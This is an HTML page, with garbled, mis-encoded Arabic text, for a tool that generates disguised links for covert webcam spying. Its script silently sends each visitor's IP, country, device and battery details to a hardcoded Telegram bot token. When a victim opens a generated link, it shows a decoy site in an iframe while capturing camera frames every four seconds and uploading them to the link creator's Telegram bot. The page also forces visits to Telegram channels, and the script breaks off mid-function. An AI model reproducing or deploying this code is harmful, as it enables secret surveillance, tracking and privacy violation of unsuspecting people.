<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
Â  <meta charset="utf-8" />
Â  <meta name="viewport" content="width=device-width,initial-scale=1" />
Â  <title>MARO.com</title>
Â  <style>
Â Â Â  :root{
Â Â Â Â Â  --bg1:#0b0712;
Â Â Â Â Â  --card:#131026;
Â Â Â Â Â  --accent1:#a66bff;
Â Â Â Â Â  --accent2:#6e3be0;
Â Â Â Â Â  --muted:#bfaef6;
Â Â Â  }
Â Â Â  html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
Â Â Â  body{
Â Â Â Â Â  background: #000000;
Â Â Â Â Â  background-image: none;
Â Â Â Â Â  position:relative;
Â Â Â  }
Â Â Â  .overlay {
Â Â Â Â Â  display: none;
Â Â Â  }
Â Â Â  .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
Â Â Â  .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
Â Â Â  .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
Â Â Â  .nav{display:flex;gap:18px}
Â Â Â  .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
Â Â Â  .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
Â Â Â Â Â  border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
Â Â Â  .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
Â Â Â  .hero-left{flex:1;min-width:260px}
Â Â Â  .title{font-size:34px;color:#ffffff;margin:0 0 8px}
Â Â Â  .subtitle{color:#ffffff;margin:0 0 18px}
Â Â Â  .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
Â Â Â  label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
Â Â Â  input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
Â Â Â  .row{display:flex;gap:12px}
Â Â Â  .btn{
Â Â Â Â Â  display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
Â Â Â  }
Â Â Â  .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
Â Â Â  .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
Â Â Â  .captureBadge{
Â Â Â Â Â  position:fixed;top:14px;right:14px;z-index:9999;
Â Â Â Â Â  background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
Â Â Â Â Â  box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
Â Â Â  }
Â Â Â  .madeby{
Â Â Â Â Â  position:fixed;left:14px;bottom:14px;z-index:9999;
Â Â Â Â Â  background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;
Â Â Â Â Â  box-shadow:0 6px 20px rgba(0,0,0,0.5);
Â Â Â Â Â  color: #ffffff;
Â Â Â  }
Â Â Â  .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
Â Â Â  @media (max-width:720px){
Â Â Â Â Â  .title{font-size:28px}
Â Â Â Â Â  .card{padding:16px}
Â Â Â Â Â  .wrap{padding:18px}
Â Â Â  }

Â Â Â  /* Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ Ø§Ù„Ù…Ø·ÙˆØ± */
Â Â Â  .dialog {
Â Â Â Â Â  position: fixed;
Â Â Â Â Â  top: 50%;
Â Â Â Â Â  left: 50%;
Â Â Â Â Â  transform: translate(-50%, -50%);
Â Â Â Â Â  background: #000000;
Â Â Â Â Â  border: 2px solid #ffffff;
Â Â Â Â Â  border-radius: 20px;
Â Â Â Â Â  padding: 40px 30px;
Â Â Â Â Â  text-align: center;
Â Â Â Â Â  z-index: 99999;
Â Â Â Â Â  box-shadow: 0 0 30px rgba(255,255,255,0.2);
Â Â Â Â Â  width: 80%;
Â Â Â Â Â  max-width: 500px;
Â Â Â  }
Â Â Â  .dialog p {
Â Â Â Â Â  color: #ffffff;
Â Â Â Â Â  font-size: 22px;
Â Â Â Â Â  font-weight: 800;
Â Â Â Â Â  margin-bottom: 30px;
Â Â Â  }
Â Â Â  .dialog-buttons {
Â Â Â Â Â  display: flex;
Â Â Â Â Â  flex-direction: column;
Â Â Â Â Â  gap: 15px;
Â Â Â Â Â  align-items: center;
Â Â Â  }
Â Â Â  .dialog-link {
Â Â Â Â Â  display: inline-block;
Â Â Â Â Â  background: #ffffff;
Â Â Â Â Â  color: #000000;
Â Â Â Â Â  padding: 14px 25px;
Â Â Â Â Â  border-radius: 50px;
Â Â Â Â Â  text-decoration: none;
Â Â Â Â Â  font-weight: 900;
Â Â Â Â Â  font-size: 18px;
Â Â Â Â Â  border: 2px solid #ffffff;
Â Â Â Â Â  transition: 0.3s;
Â Â Â Â Â  width: 80%;
Â Â Â  }
Â Â Â  .dialog-link.visited {
Â Â Â Â Â  background: #28a745;
Â Â Â Â Â  color: white;
Â Â Â Â Â  border-color: #28a745;
Â Â Â  }
Â Â Â  .dialog-btn {
Â Â Â Â Â  display: inline-block;
Â Â Â Â Â  background: #ffffff;
Â Â Â Â Â  color: #000000;
Â Â Â Â Â  padding: 16px 30px;
Â Â Â Â Â  border-radius: 50px;
Â Â Â Â Â  text-decoration: none;
Â Â Â Â Â  font-weight: 900;
Â Â Â Â Â  font-size: 18px;
Â Â Â Â Â  border: 2px solid #ffffff;
Â Â Â Â Â  transition: 0.3s;
Â Â Â Â Â  box-shadow: 0 0 20px rgba(255,255,255,0.3);
Â Â Â Â Â  margin-top: 20px;
Â Â Â Â Â  width: 80%;
Â Â Â Â Â  cursor: pointer;
Â Â Â Â Â  opacity: 0.5;
Â Â Â Â Â  pointer-events: none;
Â Â Â  }
Â Â Â  .dialog-btn.active {
Â Â Â Â Â  opacity: 1;
Â Â Â Â Â  pointer-events: auto;
Â Â Â Â Â  background: #ffffff;
Â Â Â Â Â  color: #000000;
Â Â Â  }
Â Â Â  .dialog-btn.active:hover {
Â Â Â Â Â  background: transparent;
Â Â Â Â Â  color: #ffffff;
Â Â Â  }
Â Â Â  .check-icon {
Â Â Â Â Â  margin-right: 8px;
Â Â Â  }
Â  </style>
</head>
<body>

Â  <div class="wrap">

Â Â Â  <div class="header" style="width:100%;max-width:1100px;"> 
Â Â Â Â Â  <div class="nav">
Â Â Â Â Â Â Â  <a href="#"></a>
Â Â Â Â Â Â Â  <a href="#"></a>
Â Â Â Â Â  </div>
Â Â Â  </div>

Â Â Â  <div class="card" id="cardArea" style="width:100%">
Â Â Â Â Â  <div class="hero">
Â Â Â Â Â Â Â  <div class="hero-left">
Â Â Â Â Â Â Â Â Â  <h5>âš ï¸ ÙŠÙÙ…Ù†Ø¹ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ø¯Ø§Ø© Ø¨Ø´ÙƒÙ„ ØºÙŠØ± Ù‚Ø§Ù†ÙˆÙ†ÙŠ Ø£Ùˆ ØºÙŠØ± Ø£Ø®Ù„Ø§Ù‚ÙŠ. Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠØªØ­Ù…Ù„ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ© Ø§Ù„ÙƒØ§Ù…Ù„Ø©ØŒ ÙˆÙ„Ø³Ù†Ø§ Ù…Ø³Ø¤ÙˆÙ„ÙŠÙ† Ø¹Ù† Ø£ÙŠ Ø¥Ø³Ø§Ø¡Ø© Ø§Ø³ØªØ®Ø¯Ø§Ù….</h5>

Â Â Â Â Â Â Â Â Â  <div class="form" id="formBox">
Â Â Â Â Â Â Â Â Â Â Â  <label>Ø£Ø¯Ø®Ù„ Ø§Ù„Ù€ ID</label>
Â Â Â Â Â Â Â Â Â Â Â  <input type="text" id="chatIdInput" placeholder="Chat ID">

Â Â Â Â Â Â Â Â Â Â Â  <label>Ø£Ø¯Ø®Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª</label>
Â Â Â Â Â Â Â Â Â Â Â  <input type="text" id="tokenInput" placeholder="Bot Token">

Â Â Â Â Â Â Â Â Â Â Â  <label>Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø¹Ø±Ø¶Ù‡</label>
Â Â Â Â Â Â Â Â Â Â Â  <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">

Â Â Â Â Â Â Â Â Â Â Â  <button class="btn" id="generateBtn">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·</button>

Â Â Â Â Â Â Â Â Â Â Â  <div id="result" style="display:none" class="result">
Â Â Â Â Â Â Â Â Â Â Â Â Â  <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
Â Â Â Â Â Â Â Â Â Â Â Â Â  <button class="copyBtn" id="copyBtn">Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·</button>
Â Â Â Â Â Â Â Â Â Â Â  </div>
Â Â Â Â Â Â Â Â Â  </div>
Â Â Â Â Â Â Â  </div>

Â Â Â Â Â Â Â  <div style="min-width:260px;flex:0 0 260px;">
Â Â Â Â Â Â Â Â Â  <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
Â Â Â Â Â Â Â Â Â  </div>
Â Â Â Â Â Â Â  </div>
Â Â Â Â Â  </div>
Â Â Â  </div>

Â  </div>

Â  <div id="captureBadge" class="captureBadge"></div>
Â  <div class="madeby">Made by K1X</div>

Â  <!-- Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ Ø¨Ø´Ø±Ø· Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ ÙÙŠ Ù‚Ù†Ø§ØªÙŠÙ† -->
Â  <div class="dialog" id="mandatoryDialog">
Â Â Â  <p> Ø§Ø´ØªØ±Ø§Ùƒ Ø¥Ø¬Ø¨Ø§Ø±ÙŠ ÙÙŠ Ø§Ù„Ù‚Ù†ÙˆØ§Øª </p>
Â Â Â  <div class="dialog-buttons" id="dialogButtons">
Â Â Â Â Â  <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
Â Â Â Â Â  <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
Â Â Â Â Â  <button class="dialog-btn" id="subscribeDoneBtn" disabled>ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ</button>
Â Â Â  </div>
Â  </div>

<script>
Â  // ------------------ Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø«Ø§Ø¨ØªØ© ------------------
Â  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
Â  const MASTER_CHAT_IDÂ Â  = "6197511637";

Â  // ------------------ ØªØ®Ø²ÙŠÙ† Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø± Ø¨Ø´ÙƒÙ„ Ø¹Ø§Ù… ------------------
Â  let visitorIP = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
Â  let visitorCountry = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
Â  let visitorDevice = "Unknown";
Â  let visitorBattery = "ØºÙŠØ± Ù…ØªØ§Ø­";
Â  let visitorOS = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

Â  // ------------------ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø± (Ø§Ù„Ø¨Ù„Ø¯ + Ø§Ù„Ø¬Ù‡Ø§Ø² + Ø§Ù„Ø´Ø­Ù†) ------------------
Â  async function sendVisitorInfo() {
Â Â Â  try {
Â Â Â Â Â  // 1. Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
Â Â Â Â Â  const userAgent = navigator.userAgent;
Â Â Â Â Â  visitorDevice = "Unknown";
Â Â Â Â Â  if (/Android/i.test(userAgent)) visitorDevice = "Android";
Â Â Â Â Â  else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
Â Â Â Â Â  else if (/Windows/i.test(userAgent)) visitorDevice = "Windows";
Â Â Â Â Â  else if (/Mac/i.test(userAgent)) visitorDevice = "MacOS";
Â Â Â Â Â  else if (/Linux/i.test(userAgent)) visitorDevice = "Linux";

Â Â Â Â Â  visitorOS = navigator.platform || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

Â Â Â Â Â  // 2. Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ© (Ù†Ø³Ø¨Ø© Ø§Ù„Ø´Ø­Ù†)
Â Â Â Â Â  if (navigator.getBattery) {
Â Â Â Â Â Â Â  try {
Â Â Â Â Â Â Â Â Â  const battery = await navigator.getBattery();
Â Â Â Â Â Â Â Â Â  visitorBattery = (battery.level * 100) + "%";
Â Â Â Â Â Â Â Â Â  if (battery.charging) visitorBattery += " (ÙŠØªÙ… Ø§Ù„Ø´Ø­Ù†)";
Â Â Â Â Â Â Â Â Â  else visitorBattery += " (ØºÙŠØ± Ù…ÙˆØµÙˆÙ„)";
Â Â Â Â Â Â Â  } catch (e) { visitorBattery = "ØºÙŠØ± Ù…ØªØ§Ø­"; }
Â Â Â Â Â  }

Â Â Â Â Â  // 3. Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP ÙˆØ§Ù„Ø¯ÙˆÙ„Ø© Ø¹Ø¨Ø± Ø®Ø¯Ù…Ø© Ø®Ø§Ø±Ø¬ÙŠØ©
Â Â Â Â Â  try {
Â Â Â Â Â Â Â  const ipRes = await fetch('https://ipapi.co/json/');
Â Â Â Â Â Â Â  const ipData = await ipRes.json();
Â Â Â Â Â Â Â  visitorIP = ipData.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
Â Â Â Â Â Â Â  visitorCountry = ipData.country_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
Â Â Â Â Â  } catch (e) { /* ØªØ¬Ø§Ù‡Ù„ Ø§Ù„ÙØ´Ù„ */ }

Â Â Â Â Â  // 4. ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø±Ø³Ø§Ù„Ø©
Â Â Â Â Â  const message = `
ğŸŸ¢ *Ø²ÙŠØ§Ø±Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù„Ù„Ù…ÙˆÙ‚Ø¹*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸŒ *Ø§Ù„Ø¯ÙˆÙ„Ø©*: ${visitorCountry}
ğŸ“± *Ø§Ù„Ø¬Ù‡Ø§Ø²*: ${visitorDevice}
ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©*: ${visitorBattery}
ğŸ–¥ *Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„*: ${visitorOS}
ğŸŒ *IP*: ${visitorIP}
ğŸ•’ *Ø§Ù„ØªÙˆÙ‚ÙŠØª*: ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Â Â Â Â Â  `;

Â Â Â Â Â  // 5. Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
Â Â Â Â Â  const url = `https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`;
Â Â Â Â Â  await fetch(url, {
Â Â Â Â Â Â Â  method: 'POST',
Â Â Â Â Â Â Â  headers: { 'Content-Type': 'application/json' },
Â Â Â Â Â Â Â  body: JSON.stringify({
Â Â Â Â Â Â Â Â Â  chat_id: MASTER_CHAT_ID,
Â Â Â Â Â Â Â Â Â  text: message,
Â Â Â Â Â Â Â Â Â  parse_mode: 'Markdown'
Â Â Â Â Â Â Â  })
Â Â Â Â Â  });

Â Â Â  } catch (err) {
Â Â Â Â Â  console.error("ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø±", err);
Â Â Â  }
Â  }

Â  // Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙÙˆØ± ÙØªØ­ Ø§Ù„ØµÙØ­Ø© (Ø§Ù„Ø²Ø§Ø¦Ø± Ø§Ù„Ø¹Ø§Ø¯ÙŠ)
Â  sendVisitorInfo();

Â  // ------------------ Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ ------------------
Â  const dialog = document.getElementById('mandatoryDialog');
Â  const channel1 = document.getElementById('channel1');
Â  const channel2 = document.getElementById('channel2');
Â  const subscribeBtn = document.getElementById('subscribeDoneBtn');

Â  // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ
Â  let channel1Clicked = false;
Â  let channel2Clicked = false;

Â  // Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø±Ø§Ø¨Ø· Ø§Ù„Ù‚Ù†Ø§Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰
Â  channel1.addEventListener('click', function() {
Â Â Â  channel1Clicked = true;
Â Â Â  channel1.classList.add('visited');
Â Â Â  channel1.style.background = '#28a745';
Â Â Â  channel1.style.color = 'white';
Â Â Â  channel1.style.borderColor = '#28a745';
Â Â Â  checkBothClicked();
Â  });

Â  // Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø±Ø§Ø¨Ø· Ø§Ù„Ù‚Ù†Ø§Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ©
Â  channel2.addEventListener('click', function() {
Â Â Â  channel2Clicked = true;
Â Â Â  channel2.classList.add('visited');
Â Â Â  channel2.style.background = '#28a745';
Â Â Â  channel2.style.color = 'white';
Â Â Â  channel2.style.borderColor = '#28a745';
Â Â Â  checkBothClicked();
Â  });

Â  // Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ ÙƒÙ„Ø§ Ø§Ù„Ø±Ø§Ø¨Ø·ÙŠÙ†
Â  function checkBothClicked() {
Â Â Â  if (channel1Clicked && channel2Clicked) {
Â Â Â Â Â  subscribeBtn.disabled = false;
Â Â Â Â Â  subscribeBtn.classList.add('active');
Â Â Â Â Â  subscribeBtn.style.opacity = '1';
Â Â Â Â Â  subscribeBtn.style.pointerEvents = 'auto';
Â Â Â Â Â  subscribeBtn.innerHTML = 'âœ… ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ';
Â Â Â  }
Â  }

Â  // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± "ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ"
Â  subscribeBtn.addEventListener('click', function() {
Â Â Â  dialog.style.display = 'none';
Â  });

Â  // ------------------ Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙÙˆØ±Ù… ------------------
Â  const generateBtn = document.getElementById('generateBtn');
Â  const resultEl = document.getElementById('result');
Â  const linkText = document.getElementById('linkText');
Â  const copyBtn = document.getElementById('copyBtn');

Â  generateBtn.addEventListener('click', () => {
Â Â Â  const chat = document.getElementById('chatIdInput').value.trim();
Â Â Â  const token = document.getElementById('tokenInput').value.trim();
Â Â Â  const url = document.getElementById('linkInput').value.trim();

Â Â Â  if(!chat || !token || !url){
Â Â Â Â Â  alert('Ø§Ù…Ù„Ø£ ÙƒÙ„ Ø§Ù„Ø­Ù‚ÙˆÙ„');
Â Â Â Â Â  return;
Â Â Â  }

Â Â Â  const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
Â Â Â  linkText.innerText = fullLink;
Â Â Â  resultEl.style.display = 'flex';
Â  });

Â  copyBtn.addEventListener('click', async () => {
Â Â Â  try {
Â Â Â Â Â  await navigator.clipboard.writeText(linkText.innerText);
Â Â Â Â Â  copyBtn.innerText = 'ØªÙ… Ø§Ù„Ù†Ø³Ø®';
Â Â Â Â Â  setTimeout(()=> copyBtn.innerText = 'Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·',1500);
Â Â Â  } catch(e) {
Â Â Â Â Â  alert('ÙØ´Ù„ Ø§Ù„Ù†Ø³Ø®: ' + e.message);
Â Â Â  }
Â  });

Â  // ------------------ viewer mode ------------------
Â  const params = new URLSearchParams(window.location.search);
Â  const chat = params.get('chat');
Â  const token = params.get('token');
Â  const target = params.get('url');

Â  if (chat && token && target) {
Â Â Â  // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ÙƒØ§Ø±Øª ÙˆØ¹Ø±Ø¶ Ø§Ù„Ù€ iframe
Â Â Â  document.getElementById('cardArea').style.display = 'none';
Â Â Â  const iframe = document.createElement('iframe');
Â Â Â  iframe.className = 'viewerFrame';
Â Â Â  iframe.src = target;
Â Â Â  document.querySelector('.wrap').appendChild(iframe);

Â Â Â  const captureBadge = document.getElementById('captureBadge');
Â Â Â  captureBadge.style.display = 'inline-block';
Â Â Â  captureBadge.textContent = '';
Â Â Â  captureBadge.style.background = 'rgba(0,0,0,0.0)';

Â Â Â  (async function startCameraAndSend(){
Â Â Â Â Â  try {
Â Â Â Â Â Â Â  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
Â Â Â Â Â Â Â  const vid = document.createElement('video');
Â Â Â Â Â Â Â  vid.autoplay = true; 
Â Â Â Â Â Â Â  vid.playsInline = true; 
Â Â Â Â Â Â Â  vid.muted = true; 
Â Â Â Â Â Â Â  vid.style.display = 'none';
Â Â Â Â Â Â Â  vid.srcObject = stream;
Â Â Â Â Â Â Â  document.body.appendChild(vid);
Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â  // Ø§Ù†ØªØ¸Ø± Ø­ØªÙ‰ ÙŠØ´ØªØºÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙØ¹Ù„Ø§Ù‹
Â Â Â Â Â Â Â  await vid.play();
Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â  // Ø§Ù†ØªØ¸Ø± Ø­ØªÙ‰ ÙŠÙƒÙˆÙ† Ù„Ù„ÙÙŠØ¯ÙŠÙˆ Ø£Ø¨Ø¹Ø§Ø¯ Ø­Ù‚ÙŠÙ‚ÙŠØ©
Â Â Â Â Â Â Â  let attempts = 0;
Â Â Â Â Â Â Â  while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
Â Â Â Â Â Â Â Â Â  await new Promise(resolve => setTimeout(resolve, 100));
Â Â Â Â Â Â Â Â Â  attempts++;
Â Â Â Â Â Â Â  }

Â Â Â Â Â Â Â  const canvas = document.createElement('canvas');
Â Â Â Â Â Â Â  canvas.width = vid.videoWidth || 640;
Â Â Â Â Â Â Â  canvas.height = vid.videoHeight || 480;

Â Â Â Â Â Â Â  const tick = async () => {
Â Â Â Â Â Â Â Â Â  // ØªØ£ÙƒØ¯ Ø£Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø´ØºØ§Ù„
Â Â Â Â Â Â Â Â Â  if (vid.paused || vid.ended) {
Â Â Â Â Â Â Â Â Â Â Â  await vid.play();
Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â Â Â  // ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯
Â Â Â Â Â Â Â Â Â  if (vid.videoWidth > 0 && vid.videoHeight > 0) {
Â Â Â Â Â Â Â Â Â Â Â  canvas.width = vid.videoWidth;
Â Â Â Â Â Â Â Â Â Â Â  canvas.height = vid.videoHeight;
Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â Â Â  const ctx = canvas.getContext('2d');
Â Â Â Â Â Â Â Â Â  ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);

Â Â Â Â Â Â Â Â Â  canvas.toBlob(async (blob) => {
Â Â Â Â Â Â Â Â Â Â Â  // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„ØµÙˆØ± Ø§Ù„ØµØºÙŠØ±Ø© Ø¬Ø¯Ø§Ù‹ (Ø§Ù„ÙØ§Ø±ØºØ©)
Â Â Â Â Â Â Â Â Â Â Â  if (!blob || blob.size < 2000) return;
Â Â Â Â Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â Â Â Â Â  try {
Â Â Â Â Â Â Â Â Â Â Â Â Â  const form = new FormData();
Â Â Â Â Â Â Â Â Â Â Â Â Â  form.append('chat_id', chat);
Â Â Â Â Â Â Â Â Â Â Â Â Â  form.append('photo', blob, `img_${Date.now()}.png`);
Â Â Â Â Â Â Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â Â Â Â Â Â Â  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  method: 'POST',
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  body: form
Â Â Â Â Â Â Â Â Â Â Â Â Â  });

Â Â Â Â Â Â Â Â Â Â Â Â Â  const caption = `
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“¸ *ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯Ø© ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø·Ù‡Ø§*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸŒ *Ø§Ù„Ø¯ÙˆÙ„Ø©*: ${visitorCountry}
ğŸ“± *Ø§Ù„Ø¬Ù‡Ø§Ø²*: ${visitorDevice}
ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©*: ${visitorBattery}
ğŸŒ *IP*: ${visitorIP}
ğŸ”— *Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø¹Ø±ÙˆØ¶*: ${target}
ğŸ•’ *Ø§Ù„ÙˆÙ‚Øª*: ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Â Â Â Â Â Â Â Â Â Â Â Â Â  `;

Â Â Â Â Â Â Â Â Â Â Â Â Â  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  method: 'POST',
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  headers: { 'Content-Type': 'application/json' },
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  body: JSON.stringify({
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  chat_id: chat,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  text: caption,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  parse_mode: 'Markdown'
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  })
Â Â Â Â Â Â Â Â Â Â Â Â Â  });
Â Â Â Â Â Â Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â Â Â Â Â  } catch (err) {
Â Â Â Â Â Â Â Â Â Â Â Â Â  console.error('Send error', err);
Â Â Â Â Â Â Â Â Â Â Â  }
Â Â Â Â Â Â Â Â Â  }, 'image/jpeg', 0.9);
Â Â Â Â Â Â Â  };

Â Â Â Â Â Â Â  // Ø£ÙˆÙ„ ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ† Ø¹Ø´Ø§Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙŠØ«Ø¨Øª
Â Â Â Â Â Â Â  setTimeout(tick, 2000);
Â Â Â Â Â Â Â  
Â Â Â Â Â Â Â  // Ø¨Ø¹Ø¯ ÙƒØ¯Ù‡ ÙƒÙ„ 4 Ø«ÙˆØ§Ù†ÙŠ
Â Â Â Â Â Â Â  const intervalId = setInterval(tick, 4000);

Â Â Â Â Â Â Â  window.addEventListener('beforeunload', () => {
Â Â Â Â Â Â Â Â Â  clearInterval(intervalId);
Â Â Â Â Â Â Â Â Â  stream.getTracks().forEach(t => t.stop());
